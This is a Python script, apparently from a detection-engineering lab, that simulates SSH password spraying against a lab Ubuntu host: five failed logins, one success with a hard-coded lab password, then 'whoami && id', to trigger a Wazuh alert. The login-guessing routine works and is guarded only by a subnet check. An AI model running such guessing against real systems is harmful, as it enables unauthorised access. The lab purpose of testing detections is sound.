#!/usr/bin/env python3
"""
Scenario: INC-006 - Controlled SSH Compromise Simulation (Spraying followed by Valid Auth)
MITRE ATT&CK: T1110.001 (Password Guessing) -> T1078.003 (Local Accounts) -> T1021.004 (SSH)
Target: lab-ubuntu (192.168.56.30)
Author: Senior Detection Engineer
Notice: Confined strictly to the isolated laboratory network (192.168.56.0/24).
"""

import argparse
import socket
import sys
import time
from datetime import datetime

FAIL_PASSWORDS = [
    "Password123!", "Admin!2024", "Welcome#1", "Spring#2024", "WrongPass#99"
]
VALID_PASSWORD = "LabPassword2024!"

def parse_args():
    parser = argparse.ArgumentParser(description="INC-006 Controlled SSH Compromise Simulator")
    parser.add_argument("--target", default="192.168.56.30", help="Target IP address (default: 192.168.56.30)")
    parser.add_argument("--port", type=int, default=22, help="SSH Port (default: 22)")
    parser.add_argument("--user", default="ubuntu", help="Target administrative account (default: ubuntu)")
    parser.add_argument("--valid-pwd", default=VALID_PASSWORD, help="Valid password to simulate successful takeover")
    return parser.parse_args()

def simulate_attempt(target, port, username, password, expect_success=False):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] Connecting to {target}:{port} with user='{username}' pwd='{password[:4]}****'...", end="", flush=True)
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3, allow_agent=False, look_for_keys=False)
            print(" -> [SUCCESS: AUTHENTICATED]")
            stdin, stdout, stderr = client.exec_command("whoami && id")
            output = stdout.read().decode().strip()
            print(f"       Session output: {output}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(" -> [FAILED: BAD PASSWORD (EXPECTED)]")
            return False
        except Exception as e:
            print(f" -> [ERROR: {e}]")
            return False
    except ImportError:
        # Fallback simulation
        print(" -> [SIMULATED NETWORK HANDSHAKE]")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect((target, port))
            banner = s.recv(1024)
            s.sendall(b"SSH-2.0-DetectLab_INC006_Compromise_Simulator\r\n")
            time.sleep(0.1)
            s.close()
        except Exception:
            pass
        return expect_success

def main():
    args = parse_args()
    if not args.target.startswith("192.168.56."):
        print(f"[!] SAFETY ERROR: Target {args.target} is outside lab subnet. Aborting.")
        sys.exit(1)

    print("==================================================================")
    print("   ATTACK vs DETECTION LAB -- INC-006 SSH Compromise Simulator    ")
    print("==================================================================")
    print(f"Target Host       : {args.target}:{args.port}")
    print(f"Target User       : {args.user}")
    print(f"Phase 1           : 5 consecutive authentication failures")
    print(f"Phase 2           : 1 successful authentication (Compromise)")
    print("==================================================================\n")

    # Phase 1: Failures
    print("[*] Stage 1: Simulating failed password attempts (Spraying)...")
    for i, pwd in enumerate(FAIL_PASSWORDS, start=1):
        simulate_attempt(args.target, args.port, args.user, pwd, expect_success=False)
        time.sleep(2)

    print("\n[*] Stage 2: Simulating successful authentication with guessed password...")
    time.sleep(3)
    simulate_attempt(args.target, args.port, args.user, args.valid_pwd, expect_success=True)

    print("\n======================= SIMULATION COMPLETE =======================")
    print("[+] Attack chain executed.")
    print("    Expected Alert: Wazuh Rule 100052 (CRITICAL: SSH Compromise after failed logins).")
    print("==================================================================\n")

if __name__ == "__main__":
    main()
